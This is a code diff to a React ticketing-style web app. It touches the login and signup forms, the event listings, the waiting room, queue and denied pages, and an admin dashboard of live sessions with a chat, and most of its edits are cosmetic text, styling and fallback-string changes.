@@ -99,7 +99,6 @@ export default function App() {
             if (currentPage === 'auth') {
                 await findOrCreateSession(u);
             } else {
-                // If already inside (e.g. refresh), just re-sync session
                 await findOrCreateSession(u);
             }
             setIsLoading(false); 
@@ -131,7 +130,7 @@ export default function App() {
       if (snap.exists()) {
           const d = snap.data();
           if (d.accessGranted === 'denied') setCurrentPage('denied');
-          else if (d.accessGranted === 'allowed' && currentPage === 'auth') setCurrentPage('home'); // Go Home after login
+          else if (d.accessGranted === 'allowed' && currentPage === 'auth') setCurrentPage('home'); 
           else if (d.status === 'waiting_approval' && currentPage === 'auth') setCurrentPage('waiting_room');
       }
   };
@@ -150,7 +149,7 @@ export default function App() {
         if(notifs.length > 0 && (!activeNotification || notifs[notifs.length-1].timestamp !== activeNotification?.timestamp)) setActiveNotification(notifs[notifs.length-1]);
         
         if (d.accessGranted === 'denied') setCurrentPage('denied');
-        else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('home'); // Approved -> Home
+        else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('home'); 
       }
     });
   }, [currentSessionId, currentPage, isChatOpen]);
@@ -202,7 +201,7 @@ export default function App() {
 
   const handleRealLogin = async () => {
       setAuthError(''); if (!tempUser.email || !tempUser.pass) return setAuthError('Missing fields');
-      try { const cred = await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await findOrCreateSession(cred.user); } catch (err) { setAuthError("Error: " + err.message); }
+      try { const cred = await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await findOrCreateSession(cred.user); } catch (err) { setAuthError("Invalid Login"); }
   };
 
   const handleExitDenied = async () => { sessionStorage.clear(); await signOut(auth); window.location.reload(); };
@@ -258,7 +257,6 @@ export default function App() {
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
       
-      {/* HEADER */}
       {!isAdminLoggedIn && currentPage !== 'auth' && (
         <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
             <div className="flex items-center gap-3 z-20">
@@ -285,30 +283,31 @@ export default function App() {
 
       <main className={`min-h-screen ${!isAdminLoggedIn ? 'pt-20 pb-24 px-4 lg:px-8 max-w-7xl mx-auto' : 'bg-[#f1f5f9] text-gray-900'}`}>
         
-        {/* AUTH */}
         {currentPage === 'auth' && (
            <div className="fixed inset-0 z-[100] bg-[#0a0e14] flex items-center justify-center p-4">
-              <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
-                 <div className="text-center"><h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup'?txt.verifyTitle:txt.loginTitle}</h2><p className="text-xs font-bold text-gray-500 uppercase tracking-widest">{authMode==='signup'?txt.verifySub:txt.loginSub}</p></div>
+              <div className="bg-white text-black w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
+                 <div className="text-center">
+                    <h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup' ? (txt?.verifyTitle || "Create Account") : (txt?.loginTitle || "Welcome Back")}</h2>
+                    <p className="text-xs font-bold text-gray-600 uppercase tracking-widest">{authMode==='signup' ? (txt?.verifySub || "Verify Identity") : (txt?.loginSub || "Log in to enter")}</p>
+                 </div>
                  <div className="space-y-3">
-                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
-                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.email} value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
-                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.pass} value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
-                     {authMode === 'signup' && <div className="flex items-center gap-3 pt-2"><input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} /><p className="text-[10px] font-bold text-gray-500">{txt.agree}</p></div>}
+                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
+                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.email} value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
+                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.pass} value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
+                     {authMode === 'signup' && <div className="flex items-center gap-3 pt-2"><input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} /><p className="text-[10px] font-bold text-gray-600">I agree to Terms</p></div>}
                  </div>
                  {authError && <p className="text-center text-red-500 font-bold text-xs">{authError}</p>}
-                 <button onClick={authMode === 'signup' ? handleRealSignup : handleRealLogin} className="w-full bg-[#026cdf] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-lg">{authMode === 'signup' ? txt.btnJoin : txt.btnLogin}</button>
-                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-400 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? txt.haveAcc : txt.noAcc}</button></div>
+                 <button onClick={authMode === 'signup' ? handleRealSignup : handleRealLogin} className="w-full bg-[#026cdf] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-lg">{authMode === 'signup' ? (txt?.btnJoin || "Join") : (txt?.btnLogin || "Log In")}</button>
+                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-600 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? (txt?.haveAcc || "Have Account?") : (txt?.noAcc || "Create Account")}</button></div>
               </div>
            </div>
         )}
 
-        {/* HOME */}
         {currentPage === 'home' && (
           <div className="space-y-10 animate-fadeIn">
             <div className="relative h-[400px] lg:h-[500px] rounded-[40px] overflow-hidden border border-white/10 group">
               <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" /><div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
-              <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1></div>
+              <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt?.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt?.heroTitle}</h1></div>
             </div>
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); updateSession({ status: 'in_queue' }); setCurrentPage('queue'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
           </div>
@@ -317,7 +316,7 @@ export default function App() {
         {currentPage === 'waiting_room' && (
            <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn">
                <div className="w-20 h-20 border-4 border-[#026cdf] border-t-transparent rounded-full animate-spin" />
-               <div className="space-y-2"><h2 className="text-3xl font-black italic uppercase tracking-tighter">{txt.holdTitle}</h2><p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.holdSub}</p></div>
+               <div className="space-y-2"><h2 className="text-3xl font-black italic uppercase tracking-tighter">{txt?.holdTitle}</h2><p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt?.holdSub}</p></div>
                <div className="bg-[#1f262d] p-6 rounded-2xl border border-white/10 max-w-sm"><p className="text-xs font-bold text-gray-500">Session ID: <span className="text-white font-mono">{currentSessionId?.slice(0,8)}...</span></p><p className="text-xs font-bold text-gray-500 mt-2">Do not refresh.</p></div>
            </div>
         )}
@@ -325,7 +324,7 @@ export default function App() {
         {currentPage === 'denied' && (
            <div className="min-h-[80vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn bg-red-950/20 rounded-3xl mt-10 border border-red-900/50">
                <AlertOctagon className="w-24 h-24 text-red-500 animate-pulse" />
-               <div className="space-y-4"><h2 className="text-5xl font-black italic uppercase tracking-tighter text-red-500">{txt.deniedTitle}</h2><p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.deniedSub}</p></div>
+               <div className="space-y-4"><h2 className="text-5xl font-black italic uppercase tracking-tighter text-red-500">{txt?.deniedTitle}</h2><p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt?.deniedSub}</p></div>
                <button onClick={handleExitDenied} className="px-8 py-3 bg-red-900/50 text-red-200 rounded-full font-bold uppercase hover:bg-red-900 transition-all">Exit</button>
            </div>
         )}
@@ -342,7 +341,7 @@ export default function App() {
                        return (<div key={i} className={`flex flex-col items-center gap-2 ${isActive ? 'scale-110' : 'opacity-30'}`}><div className={`w-4 h-4 rounded-full ${isActive ? 'bg-[#026cdf] animate-pulse' : 'bg-gray-600'}`} /><span className={`text-[10px] font-black uppercase tracking-widest ${isActive ? 'text-[#026cdf]' : 'text-gray-500'}`}>{step}</span></div>)
                    })}
                </div>
-               <div className="space-y-4"><h2 className="text-6xl lg:text-9xl font-black italic text-white tracking-tighter leading-none">{queuePosition}</h2><p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.queueTitle}</p></div>
+               <div className="space-y-4"><h2 className="text-6xl lg:text-9xl font-black italic text-white tracking-tighter leading-none">{queuePosition}</h2><p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt?.queueTitle}</p></div>
                <div className="w-full max-w-md bg-white/5 h-4 rounded-full overflow-hidden relative border border-white/10"><div className="h-full bg-[#026cdf] transition-all duration-1000 shadow-[0_0_20px_#026cdf]" style={{ width: `${queueProgress}%` }} /></div>
            </div>
         )}
@@ -359,9 +358,10 @@ export default function App() {
           </div>
         )}
 
-        {/* ADMIN */}
+        {/* --- ADMIN DASHBOARD --- */}
         {currentPage === 'admin' && isAdminLoggedIn && (
            <div className="min-h-screen bg-[#f1f5f9] text-gray-900 pb-20 flex">
+              {/* SIDEBAR */}
               <div className={`w-full md:w-1/3 border-r border-gray-200 bg-white flex flex-col ${selectedUser ? 'hidden md:flex' : 'flex'}`}>
                   <div className="p-4 border-b border-gray-100 flex justify-between items-center bg-[#f8fafc]">
                       <div className="flex items-center gap-2"><div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" /><h2 className="font-black text-sm uppercase italic">Live Sessions</h2></div>
@@ -406,6 +406,8 @@ export default function App() {
                       )}
                   </div>
               </div>
+
+              {/* MAIN CHAT */}
               <div className={`w-full md:w-2/3 bg-[#f1f5f9] flex flex-col ${!selectedUser ? 'hidden md:flex' : 'flex'}`}>
                   {selectedUser ? (
                       <>
@@ -449,4 +451,5 @@ export default function App() {
     </div>
   );
 }
+
 
